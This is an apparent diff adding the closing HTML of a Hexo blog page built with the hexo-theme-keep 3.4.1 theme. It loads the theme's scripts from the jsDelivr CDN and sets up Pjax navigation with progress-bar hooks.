+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/toc.js"></script>
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        const pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
